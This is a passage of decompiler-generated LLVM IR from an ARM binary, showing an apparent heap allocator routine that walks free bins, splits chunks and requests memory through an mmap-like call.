
.dec_label_pc_12ee8.preheader_crit_edge:          ; preds = %bb142
  %v0_12ee054.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12ee8.preheader

dec_label_pc_12eac.preheader:                     ; preds = %bb142, %.thread12
  %v0_12eac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12eac

dec_label_pc_12eac:                               ; preds = %dec_label_pc_12eac.preheader, %dec_label_pc_12eb8
  %v0_12eac = phi i32 [ %v0_12eac.pre, %dec_label_pc_12eac.preheader ], [ %v1_12eac, %dec_label_pc_12eb8 ]
  %v1_12eac = add i32 %v0_12eac, 1
  store i32 %v1_12eac, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_12eac, 2
  br i1 %tmp208, label %dec_label_pc_12f8c.loopexit, label %dec_label_pc_12eb8

dec_label_pc_12eb8:                               ; preds = %dec_label_pc_12eac
  store i32 144312, i32* %r3.global-to-local, align 4
  %v1_12ebc = load i32, i32* @r8, align 4
  %v2_12ebc = add i32 %v1_12ebc, 144312
  %v3_12ebc = inttoptr i32 %v2_12ebc to i32*
  %v4_12ebc = load i32, i32* %v3_12ebc, align 4
  store i32 %v4_12ebc, i32* %r2.global-to-local, align 4
  %v4_12ec0 = mul i32 %v1_12eac, 4
  %v5_12ec0 = add i32 %v4_12ebc, %v4_12ec0
  store i32 %v5_12ec0, i32* %r3.global-to-local, align 4
  %v1_12ec4 = add i32 %v5_12ec0, 820
  %v2_12ec4 = inttoptr i32 %v1_12ec4 to i32*
  %v3_12ec4 = load i32, i32* %v2_12ec4, align 4
  store i32 %v3_12ec4, i32* @r4, align 4
  %v2_12ec8 = icmp eq i32 %v3_12ec4, 0
  br i1 %v2_12ec8, label %dec_label_pc_12eac, label %dec_label_pc_12ed0

dec_label_pc_12ed0:                               ; preds = %dec_label_pc_12eb8
  %v4_12ed0 = mul i32 %v1_12eac, 256
  %v5_12ed0 = add i32 %v4_12ebc, %v4_12ed0
  store i32 %v5_12ed0, i32* %r3.global-to-local, align 4
  %v1_12ed4 = add i32 %v5_12ed0, 44
  store i32 %v1_12ed4, i32* %r0.global-to-local, align 4
  %v0_12ed8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12ed8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ee8.preheader

dec_label_pc_12ee8.preheader:                     ; preds = %.dec_label_pc_12ee8.preheader_crit_edge, %dec_label_pc_12ed0
  %v0_12ee054 = phi i32 [ %v1_12ed4, %dec_label_pc_12ed0 ], [ %v0_12ee054.pre, %.dec_label_pc_12ee8.preheader_crit_edge ]
  %v0_12f04 = phi i32 [ %v3_12ec4, %dec_label_pc_12ed0 ], [ %v1_12e9c, %.dec_label_pc_12ee8.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_12ed8, %dec_label_pc_12ed0 ], [ %v0_12e9c, %.dec_label_pc_12ee8.preheader_crit_edge ]
  %v2_12ee851 = and i32 %ip.promoted, %v0_12f04
  %v4_12ee853 = icmp eq i32 %v2_12ee851, 0
  br i1 %v4_12ee853, label %dec_label_pc_12ee0, label %dec_label_pc_12ef0

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_12ee8.preheader, %dec_label_pc_12ee0
  %v2_12ee456 = phi i32 [ %v2_12ee4, %dec_label_pc_12ee0 ], [ %ip.promoted, %dec_label_pc_12ee8.preheader ]
  %v0_12ee055 = phi i32 [ %v1_12ee0, %dec_label_pc_12ee0 ], [ %v0_12ee054, %dec_label_pc_12ee8.preheader ]
  %v1_12ee0 = add i32 %v0_12ee055, 8
  %v2_12ee4 = mul i32 %v2_12ee456, 2
  %v2_12ee8 = and i32 %v2_12ee4, %v0_12f04
  %v4_12ee8 = icmp eq i32 %v2_12ee8, 0
  br i1 %v4_12ee8, label %dec_label_pc_12ee0, label %dec_label_pc_12ee8.dec_label_pc_12ef0_crit_edge

dec_label_pc_12ee8.dec_label_pc_12ef0_crit_edge:  ; preds = %dec_label_pc_12ee0
  store i32 %v1_12ee0, i32* %r0.global-to-local, align 4
  store i32 %v2_12ee4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ef0

dec_label_pc_12ef0:                               ; preds = %dec_label_pc_12ee8.dec_label_pc_12ef0_crit_edge, %dec_label_pc_12ee8.preheader
  %v0_12f10 = phi i32 [ %v2_12ee4, %dec_label_pc_12ee8.dec_label_pc_12ef0_crit_edge ], [ %ip.promoted, %dec_label_pc_12ee8.preheader ]
  %v0_12f34 = phi i32 [ %v1_12ee0, %dec_label_pc_12ee8.dec_label_pc_12ef0_crit_edge ], [ %v0_12ee054, %dec_label_pc_12ee8.preheader ]
  %v1_12ef0 = add i32 %v0_12f34, 12
  %v2_12ef0 = inttoptr i32 %v1_12ef0 to i32*
  %v3_12ef0 = load i32, i32* %v2_12ef0, align 4
  store i32 %v3_12ef0, i32* @lr, align 4
  %v9_12ef4 = icmp eq i32 %v3_12ef0, %v0_12f34
  br i1 %v9_12ef4, label %dec_label_pc_12efc, label %dec_label_pc_12f1c

dec_label_pc_12efc:                               ; preds = %dec_label_pc_12ef0
  store i32 144312, i32* %r0.global-to-local, align 4
  %v1_12f00 = load i32, i32* @r8, align 4
  %v2_12f00 = add i32 %v1_12f00, 144312
  %v3_12f00 = inttoptr i32 %v2_12f00 to i32*
  %v4_12f00 = load i32, i32* %v3_12f00, align 4
  %v2_12f04 = sub i32 -1, %v0_12f10
  %v3_12f04 = and i32 %v0_12f04, %v2_12f04
  store i32 %v3_12f04, i32* @r4, align 4
  %v1_12f08 = load i32, i32* @r5, align 4
  %v4_12f08 = mul i32 %v1_12f08, 4
  %v5_12f08 = add i32 %v4_12f08, %v4_12f00
  store i32 %v5_12f08, i32* %r3.global-to-local, align 4
  %v1_12f0c = add i32 %v0_12f34, 8
  store i32 %v1_12f0c, i32* %r0.global-to-local, align 4
  %v2_12f10 = mul i32 %v0_12f10, 2
  store i32 %v2_12f10, i32* %ip.global-to-local, align 4
  %v2_12f14 = add i32 %v5_12f08, 820
  %v3_12f14 = inttoptr i32 %v2_12f14 to i32*
  store i32 %v3_12f04, i32* %v3_12f14, align 4
  %v0_12e94.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_12e9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12e94

dec_label_pc_12f1c:                               ; preds = %dec_label_pc_12ef0
  %v1_12f1c = add i32 %v3_12ef0, 4
  %v2_12f1c = inttoptr i32 %v1_12f1c to i32*
  %v3_12f1c = load i32, i32* %v2_12f1c, align 4
  store i32 %v3_12f1c, i32* %r3.global-to-local, align 4
  %v1_12f20 = and i32 %v3_12f1c, -4
  store i32 %v1_12f20, i32* %r2.global-to-local, align 4
  %v0_12f24 = load i32, i32* @sl, align 4
  %v2_12f24 = sub i32 %v1_12f20, %v0_12f24
  store i32 %v2_12f24, i32* %ip.global-to-local, align 4
  %v1_12f28 = add i32 %v3_12ef0, 12
  %v2_12f28 = inttoptr i32 %v1_12f28 to i32*
  %v3_12f28 = load i32, i32* %v2_12f28, align 4
  store i32 %v3_12f28, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_12f24, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_12f1c
  %v6_12f30 = add i32 %v1_12f20, %v3_12ef0
  store i32 %v6_12f30, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_12f1c, %bb143
  %v2_12f34 = add i32 %v3_12f28, 8
  %v3_12f34 = inttoptr i32 %v2_12f34 to i32*
  store i32 %v0_12f34, i32* %v3_12f34, align 4
  %v0_12f38 = load i32, i32* %r3.global-to-local, align 4
  %v1_12f38 = load i32, i32* %r0.global-to-local, align 4
  %v2_12f38 = add i32 %v1_12f38, 12
  %v3_12f38 = inttoptr i32 %v2_12f38 to i32*
  store i32 %v0_12f38, i32* %v3_12f38, align 4
  %v4_12f3c = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_12e18_crit_edge, label %dec_label_pc_12f48

.dec_label_pc_12e18_crit_edge:                    ; preds = %bb144
  %v5_12f3c = add i32 %v4_12f3c, 8
  store i32 %v5_12f3c, i32* %r4.global-to-local, align 4
  %v4_12f40 = load i32, i32* %r2.global-to-local, align 4
  %v5_12f40 = add i32 %v4_12f40, 4
  %v6_12f40 = inttoptr i32 %v5_12f40 to i32*
  %v7_12f40 = load i32, i32* %v6_12f40, align 4
  store i32 %v7_12f40, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12f48:                               ; preds = %bb144
  %v1_12f48 = load i32, i32* @sl, align 4
  %v2_12f48 = add i32 %v1_12f48, %v4_12f3c
  store i32 %v2_12f48, i32* %r1.global-to-local, align 4
  %v1_12f50 = load i32, i32* @r6, align 4
  %v2_12f50 = add i32 %v1_12f50, 8
  %v3_12f50 = inttoptr i32 %v2_12f50 to i32*
  store i32 %v2_12f48, i32* %v3_12f50, align 4
  %v0_12f54 = load i32, i32* %r1.global-to-local, align 4
  %v1_12f54 = load i32, i32* @r6, align 4
  %v2_12f54 = add i32 %v1_12f54, 12
  %v3_12f54 = inttoptr i32 %v2_12f54 to i32*
  store i32 %v0_12f54, i32* %v3_12f54, align 4
  %v0_12f58 = load i32, i32* @r6, align 4
  %v1_12f58 = load i32, i32* %r1.global-to-local, align 4
  %v2_12f58 = add i32 %v1_12f58, 8
  %v3_12f58 = inttoptr i32 %v2_12f58 to i32*
  store i32 %v0_12f58, i32* %v3_12f58, align 4
  %v0_12f5c = load i32, i32* @r6, align 4
  %v1_12f5c = load i32, i32* %r1.global-to-local, align 4
  %v2_12f5c = add i32 %v1_12f5c, 12
  %v3_12f5c = inttoptr i32 %v2_12f5c to i32*
  store i32 %v0_12f5c, i32* %v3_12f5c, align 4
  %tmp210 = icmp ult i32 %v1_12f48, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_12f48
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r2.global-to-local, align 4
  %v8_12f68 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v8_12f68, i32* %r3.global-to-local, align 4
  %v4_12f6c = load i32, i32* %r1.global-to-local, align 4
  %v6_12f6c = add i32 %v8_12f68, 48
  %v7_12f6c = inttoptr i32 %v6_12f6c to i32*
  store i32 %v4_12f6c, i32* %v7_12f6c, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_12f48, %bb145
  %v0_12f70 = load i32, i32* @sl, align 4
  %v1_12f70 = or i32 %v0_12f70, 1
  store i32 %v1_12f70, i32* %r2.global-to-local, align 4
  %v0_12f74 = load i32, i32* %ip.global-to-local, align 4
  %v1_12f74 = or i32 %v0_12f74, 1
  store i32 %v1_12f74, i32* %r3.global-to-local, align 4
  %v0_12f78 = load i32, i32* @lr, align 4
  %v1_12f78 = add i32 %v0_12f78, 8
  store i32 %v1_12f78, i32* %r4.global-to-local, align 4
  %v2_12f7c = add i32 %v0_12f78, 4
  %v3_12f7c = inttoptr i32 %v2_12f7c to i32*
  store i32 %v1_12f70, i32* %v3_12f7c, align 4
  %v0_12f80 = load i32, i32* %ip.global-to-local, align 4
  %v1_12f80 = load i32, i32* %r1.global-to-local, align 4
  %v3_12f80 = add i32 %v1_12f80, %v0_12f80
  %v4_12f80 = inttoptr i32 %v3_12f80 to i32*
  store i32 %v0_12f80, i32* %v4_12f80, align 4
  %v0_12f84 = load i32, i32* %r3.global-to-local, align 4
  %v1_12f84 = load i32, i32* %r1.global-to-local, align 4
  %v2_12f84 = add i32 %v1_12f84, 4
  %v3_12f84 = inttoptr i32 %v2_12f84 to i32*
  store i32 %v0_12f84, i32* %v3_12f84, align 4
  br label %dec_label_pc_133d8

dec_label_pc_12f8c.loopexit:                      ; preds = %dec_label_pc_12eac
  br label %dec_label_pc_12f8c

dec_label_pc_12f8c:                               ; preds = %dec_label_pc_12f8c.loopexit, %dec_label_pc_12ba0, %dec_label_pc_12ba8
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %ip.global-to-local, align 4
  %v4_12f94 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_12f94, i32* @r0, align 4
  %v1_12f98 = add i32 %v4_12f94, 44
  %v2_12f98 = inttoptr i32 %v1_12f98 to i32*
  %v3_12f98 = load i32, i32* %v2_12f98, align 4
  store i32 %v3_12f98, i32* %ip.global-to-local, align 4
  %v1_12f9c = add i32 %v3_12f98, 4
  %v2_12f9c = inttoptr i32 %v1_12f9c to i32*
  %v3_12f9c = load i32, i32* %v2_12f9c, align 4
  %v0_12fa0 = load i32, i32* @sl, align 4
  %v1_12fa0 = add i32 %v0_12fa0, 16
  store i32 %v1_12fa0, i32* %r1.global-to-local, align 4
  %v1_12fa4 = and i32 %v3_12f9c, -4
  store i32 %v1_12fa4, i32* %r3.global-to-local, align 4
  %v3_12fa8 = icmp ult i32 %v1_12fa4, %v1_12fa0
  br i1 %v3_12fa8, label %dec_label_pc_12fd8, label %dec_label_pc_12fb4

dec_label_pc_12fb4:                               ; preds = %dec_label_pc_12f8c
  %v2_12fb4 = sub i32 %v1_12fa4, %v0_12fa0
  %v2_12fb8 = add i32 %v0_12fa0, %v3_12f98
  store i32 %v2_12fb8, i32* %r1.global-to-local, align 4
  %v1_12fbc = or i32 %v2_12fb4, 1
  store i32 %v1_12fbc, i32* %r3.global-to-local, align 4
  %v1_12fc0 = or i32 %v0_12fa0, 1
  store i32 %v1_12fc0, i32* %r2.global-to-local, align 4
  %v1_12fc4 = add i32 %v3_12f98, 8
  store i32 %v1_12fc4, i32* %r4.global-to-local, align 4
  store i32 %v1_12fc0, i32* %v2_12f9c, align 4
  %v0_12fcc = load i32, i32* %r1.global-to-local, align 4
  %v1_12fcc = load i32, i32* @r0, align 4
  %v2_12fcc = add i32 %v1_12fcc, 44
  %v3_12fcc = inttoptr i32 %v2_12fcc to i32*
  store i32 %v0_12fcc, i32* %v3_12fcc, align 4
  %v0_12fd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_12fd0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12fd0 = add i32 %v1_12fd0, 4
  %v3_12fd0 = inttoptr i32 %v2_12fd0 to i32*
  store i32 %v0_12fd0, i32* %v3_12fd0, align 4
  br label %dec_label_pc_133d8

dec_label_pc_12fd8:                               ; preds = %dec_label_pc_12f8c
  %v1_12fd8 = inttoptr i32 %v4_12f94 to i32*
  %v2_12fd8 = load i32, i32* %v1_12fd8, align 4
  store i32 %v2_12fd8, i32* %r3.global-to-local, align 4
  %v1_12fdc = and i32 %v2_12fd8, 2
  store i32 %v1_12fdc, i32* %ip.global-to-local, align 4
  %v2_12fdc = icmp eq i32 %v1_12fdc, 0
  %v1_12fe0 = add i32 %v4_12f94, 860
  %v2_12fe0 = inttoptr i32 %v1_12fe0 to i32*
  %v3_12fe0 = load i32, i32* %v2_12fe0, align 4
  store i32 %v3_12fe0, i32* %r1.global-to-local, align 4
  br i1 %v2_12fdc, label %dec_label_pc_12ff8, label %dec_label_pc_12fe8

dec_label_pc_12fe8:                               ; preds = %dec_label_pc_12fd8
  %v0_12fe8 = call i32 @function_134d0()
  %v0_12fec = load i32, i32* @sl, align 4
  %v1_12fec = add i32 %v0_12fec, -7
  store i32 %v1_12fec, i32* %r0.global-to-local, align 4
  %v1_12ff0 = call i32 @function_12b00(i32 %v1_12fec)
  store i32 %v1_12ff0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133d4

dec_label_pc_12ff8:                               ; preds = %dec_label_pc_12fd8
  %v1_12ff8 = add i32 %v4_12f94, 844
  %v2_12ff8 = inttoptr i32 %v1_12ff8 to i32*
  %v3_12ff8 = load i32, i32* %v2_12ff8, align 4
  store i32 %v3_12ff8, i32* %r3.global-to-local, align 4
  %v3_12ffc = icmp ult i32 %v0_12fa0, %v3_12ff8
  %v1_13000 = add i32 %v3_12fe0, -1
  store i32 %v1_13000, i32* %sb.global-to-local, align 4
  br i1 %v3_12ffc, label %dec_label_pc_130d4, label %dec_label_pc_13008

dec_label_pc_13008:                               ; preds = %dec_label_pc_12ff8
  %v1_13008 = add i32 %v4_12f94, 852
  %v2_13008 = inttoptr i32 %v1_13008 to i32*
  %v3_13008 = load i32, i32* %v2_13008, align 4
  store i32 %v3_13008, i32* %r2.global-to-local, align 4
  %v1_1300c = add i32 %v4_12f94, 848
  %v2_1300c = inttoptr i32 %v1_1300c to i32*
  %v3_1300c = load i32, i32* %v2_1300c, align 4
  store i32 %v3_1300c, i32* %r3.global-to-local, align 4
  %v6_13014 = icmp slt i32 %v3_1300c, %v3_13008
  br i1 %v6_13014, label %dec_label_pc_13018, label %dec_label_pc_130d4

dec_label_pc_13018:                               ; preds = %dec_label_pc_13008
  %v1_13018 = add i32 %v0_12fa0, 10
  %v2_1301c = add i32 %v1_13018, %v3_12fe0
  store i32 %v2_1301c, i32* %r3.global-to-local, align 4
  %v2_13020 = sub i32 0, %v3_12fe0
  %v3_13020 = and i32 %v2_1301c, %v2_13020
  store i32 %v3_13020, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_13020, %v0_12fa0
  br i1 %tmp211, label %dec_label_pc_1302c, label %dec_label_pc_130d4

dec_label_pc_1302c:                               ; preds = %dec_label_pc_13018
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_13020, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_13044 = call i32 @function_14fb4(i32 0, i32 %v3_13020, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_13044, i32* %r0.global-to-local, align 4
  %v7_13048 = icmp eq i32 %v6_13044, -1
  br i1 %v7_13048, label %dec_label_pc_1302c.dec_label_pc_130d4_crit_edge, label %dec_label_pc_13050

dec_label_pc_1302c.dec_label_pc_130d4_crit_edge:  ; preds = %dec_label_pc_1302c
  %v1_130f8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_130d4

dec_label_pc_13050:                               ; preds = %dec_label_pc_1302c
  %v1_13050 = urem i32 %v6_13044, 8
  store i32 %v1_13050, i32* %r2.global-to-local, align 4
  %v2_13050 = icmp eq i32 %v1_13050, 0
  br i1 %v2_13050, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_13050
  %v2_13054 = sub nsw i32 8, %v1_13050
  store i32 %v2_13054, i32* %r3.global-to-local, align 4
  %v2_13058 = load i32, i32* @r4, align 4
  %v3_13058 = sub i32 %v2_13058, %v2_13054
  %v3_1305c = add i32 %v2_13054, %v6_13044
  store i32 %v3_1305c, i32* %lr.global-to-local, align 4
  %v2_13064 = or i32 %v3_13058, 2
  store i32 %v2_13064, i32* %r2.global-to-local, align 4
  %v5_1306c = inttoptr i32 %v3_1305c to i32*
  store i32 %v2_13054, i32* %v5_1306c, align 4
  %v1_13070 = load i32, i32* %r2.global-to-local, align 4
  %v2_13070 = load i32, i32* %lr.global-to-local, align 4
  %v3_13070 = add i32 %v2_13070, 4
  %v4_13070 = inttoptr i32 %v3_13070 to i32*
  store i32 %v1_13070, i32* %v4_13070, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_13050
  store i32 %v6_13044, i32* %lr.global-to-local, align 4
  %v1_1306847 = load i32, i32* @r4, align 4
  %v2_1306848 = or i32 %v1_1306847, 2
  store i32 %v2_1306848, i32* %r3.global-to-local, align 4
  %v3_13074 = inttoptr i32 %v6_13044 to i32*
  store i32 0, i32* %v3_13074, align 4
  %v1_13078 = load i32, i32* %r3.global-to-local, align 4
  %v2_13078 = load i32, i32* %lr.global-to-local, align 4
  %v3_13078 = add i32 %v2_13078, 4
  %v4_13078 = inttoptr i32 %v3_13078 to i32*
  store i32 %v1_13078, i32* %v4_13078, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 144312, i32* %r2.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_13084 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_13084, i32* %ip.global-to-local, align 4
  %v1_13088 = add i32 %v4_13084, 848
  %v2_13088 = inttoptr i32 %v1_13088 to i32*
  %v3_13088 = load i32, i32* %v2_13088, align 4
  store i32 %v3_13088, i32* %r3.global-to-local, align 4
  %v1_1308c = add i32 %v4_13084, 856
  %v2_1308c = inttoptr i32 %v1_1308c to i32*
  %v3_1308c = load i32, i32* %v2_1308c, align 4
  store i32 %v3_1308c, i32* %r2.global-to-local, align 4
  %v1_13090 = add i32 %v3_13088, 1
  store i32 %v1_13090, i32* %r3.global-to-local, align 4
  %v7_13098 = icmp sgt i32 %v1_13090, %v3_1308c
  br i1 %v7_13098, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_13090, i32* %v2_1308c, align 4
  %v0_1309c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1309c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_1309c = phi i32 [ %v4_13084, %.thread27 ], [ %v1_1309c.pre, %bb147 ]
  %v0_1309c = phi i32 [ %v1_13090, %.thread27 ], [ %v0_1309c.pre, %bb147 ]
  %v2_1309c = add i32 %v1_1309c, 848
  %v3_1309c = inttoptr i32 %v2_1309c to i32*
  store i32 %v0_1309c, i32* %v3_1309c, align 4
  %v0_130a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_130a0 = add i32 %v0_130a0, 868
  %v2_130a0 = inttoptr i32 %v1_130a0 to i32*
  %v3_130a0 = load i32, i32* %v2_130a0, align 4
  store i32 %v3_130a0, i32* %r3.global-to-local, align 4
  %v1_130a4 = add i32 %v0_130a0, 880
  %v2_130a4 = inttoptr i32 %v1_130a4 to i32*
  %v3_130a4 = load i32, i32* %v2_130a4, align 4
  store i32 %v3_130a4, i32* %r2.global-to-local, align 4
  %v0_130a8 = load i32, i32* @r4, align 4
  %v2_130a8 = add i32 %v0_130a8, %v3_130a0
  store i32 %v2_130a8, i32* %r1.global-to-local, align 4
  %v1_130ac = add i32 %v0_130a0, 872
  %v2_130ac = inttoptr i32 %v1_130ac to i32*
  %v3_130ac = load i32, i32* %v2_130ac, align 4
  store i32 %v3_130ac, i32* %r3.global-to-local, align 4
  %v1_130b4 = add i32 %v0_130a0, 884
  %v2_130b4 = inttoptr i32 %v1_130b4 to i32*
  %v3_130b4 = load i32, i32* %v2_130b4, align 4
  store i32 %v3_130b4, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_130a8, %v3_130a4
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_130a8, i32* %v2_130a4, align 4
  %v0_130bc.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_130bc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_130bc = phi i32 [ %v0_130a0, %bb148 ], [ %v1_130bc.pre, %bb149 ]
  %v0_130bc = phi i32 [ %v2_130a8, %bb148 ], [ %v0_130bc.pre, %bb149 ]
  %v2_130bc = add i32 %v1_130bc, 868
  %v3_130bc = inttoptr i32 %v2_130bc to i32*
  store i32 %v0_130bc, i32* %v3_130bc, align 4
  %v0_130c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_130c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_130c0 = add i32 %v1_130c0, %v0_130c0
  store i32 %v2_130c0, i32* %r1.global-to-local, align 4
  %v1_130c4 = load i32, i32* %r2.global-to-local, align 4
  %v0_130c8 = load i32, i32* %lr.global-to-local, align 4
  %v1_130c8 = add i32 %v0_130c8, 8
  store i32 %v1_130c8, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_130c0, %v1_130c4
  br i1 %tmp213, label %bb151, label %dec_label_pc_133d4

bb151:                                            ; preds = %bb150
  %v5_130cc = load i32, i32* %ip.global-to-local, align 4
  %v6_130cc = add i32 %v5_130cc, 884
  %v7_130cc = inttoptr i32 %v6_130cc to i32*
  store i32 %v2_130c0, i32* %v7_130cc, align 4
  br label %dec_label_pc_133d4

dec_label_pc_130d4:                               ; preds = %dec_label_pc_13018, %dec_label_pc_12ff8, %dec_label_pc_1302c.dec_label_pc_130d4_crit_edge, %dec_label_pc_13008
  %v1_130f8 = phi i32 [ %v1_130f8.pre, %dec_label_pc_1302c.dec_label_pc_130d4_crit_edge ], [ %v0_12fa0, %dec_label_pc_13008 ], [ %v0_12fa0, %dec_label_pc_12ff8 ], [ %v0_12fa0, %dec_label_pc_13018 ]
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %ip.global-to-local, align 4
  %v4_130dc = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_130dc, i32* %r3.global-to-local, align 4
  %v1_130e0 = add i32 %v4_130dc, 44
  %v2_130e0 = inttoptr i32 %v1_130e0 to i32*
  %v3_130e0 = load i32, i32* %v2_130e0, align 4
  store i32 %v3_130e0, i32* %r0.global-to-local, align 4
  %v1_130e4 = add i32 %v4_130dc, 864
  %v2_130e4 = inttoptr i32 %v1_130e4 to i32*
  %v3_130e4 = load i32, i32* %v2_130e4, align 4
  store i32 %v3_130e4, i32* %r2.global-to-local, align 4
  %v1_130e8 = add i32 %v4_130dc, 840
  %v2_130e8 = inttoptr i32 %v1_130e8 to i32*
  %v3_130e8 = load i32, i32* %v2_130e8, align 4
  store i32 %v3_130e8, i32* %r3.global-to-local, align 4
  %v1_130ec = add i32 %v3_130e0, 4
  %v2_130ec = inttoptr i32 %v1_130ec to i32*
  %v3_130ec = load i32, i32* %v2_130ec, align 4
  store i32 %v3_130ec, i32* %r1.global-to-local, align 4
  %v1_130f4 = urem i32 %v3_130e4, 2
  %v2_130f4 = icmp eq i32 %v1_130f4, 0
  %v1_130f0 = add i32 %v1_130f8, 16
  %v2_130f8 = add i32 %v1_130f0, %v3_130e8
  store i32 %v2_130f8, i32* %r3.global-to-local, align 4
  %v1_130fc = and i32 %v3_130ec, -4
  store i32 %v1_130fc, i32* @r8, align 4
  br i1 %v2_130f4, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_130d4
  %v3_13100 = sub i32 %v2_130f8, %v1_130fc
  store i32 %v3_13100, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_130d4, %bb152
  %v0_13104 = phi i32 [ %v2_130f8, %dec_label_pc_130d4 ], [ %v3_13100, %bb152 ]
  %v1_13104 = load i32, i32* %sb.global-to-local, align 4
  %v2_13104 = add i32 %v1_13104, %v0_13104
  store i32 %v2_13104, i32* %r3.global-to-local, align 4
  %v1_13108 = sub i32 -1, %v1_13104
  store i32 %v1_13108, i32* %fp.global-to-local, align 4
  %v2_1310c = and i32 %v2_13104, %v1_13108
  store i32 %v2_1310c, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_1310c, 1
  br i1 %tmp154, label %dec_label_pc_13130, label %dec_label_pc_1311c

dec_label_pc_1311c:                               ; preds = %bb153
  store i32 %v2_1310c, i32* %r0.global-to-local, align 4
  %v1_13120 = call i32 @function_15210(i32 %v2_1310c)
  store i32 %v1_13120, i32* %r0.global-to-local, align 4
  %v3_13124 = icmp eq i32 %v1_13120, -1
  store i32 %v1_13120, i32* @r4, align 4
  br i1 %v3_13124, label %dec_label_pc_13130, label %dec_label_pc_1319c

dec_label_pc_13130:                               ; preds = %dec_label_pc_1311c, %bb153
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r1.global-to-local, align 4
  %v4_13138 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_13138, i32* %r6.global-to-local, align 4
  %v1_1313c = add i32 %v4_13138, 864
  %v2_1313c = inttoptr i32 %v1_1313c to i32*
  %v3_1313c = load i32, i32* %v2_1313c, align 4
  store i32 %v3_1313c, i32* %r3.global-to-local, align 4
  %v1_13140 = urem i32 %v3_1313c, 2
  %v2_13140 = icmp eq i32 %v1_13140, 0
  br i1 %v2_13140, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_13130
  %v1_13144 = load i32, i32* @r8, align 4
  %v2_13144 = load i32, i32* %sb.global-to-local, align 4
  %v3_13144 = add i32 %v2_13144, %v1_13144
  %v2_13148 = load i32, i32* @r5, align 4
  %v3_13148 = add i32 %v3_13144, %v2_13148
  store i32 %v3_13148, i32* %r3.global-to-local, align 4
  %v2_1314c = load i32, i32* %fp.global-to-local, align 4
  %v3_1314c = and i32 %v2_1314c, %v3_13148
  store i32 %v3_1314c, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_13130
  %v0_13150.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_13150 = phi i32 [ %v0_13150.pr, %.thread29thread-pre-split ], [ %v3_1314c, %bb155 ]
  %v2_13150 = icmp ugt i32 %v0_13150, 1048575
  br i1 %v2_13150, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_13168 = phi i32 [ %v0_13150, %.thread29 ], [ 1048576, %bb156 ]
  %v1_13158 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_13168, %v1_13158
  br i1 %tmp214, label %dec_label_pc_13160, label %dec_label_pc_133c4

dec_label_pc_13160:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_13168, i32* %r1.global-to-local, align 4
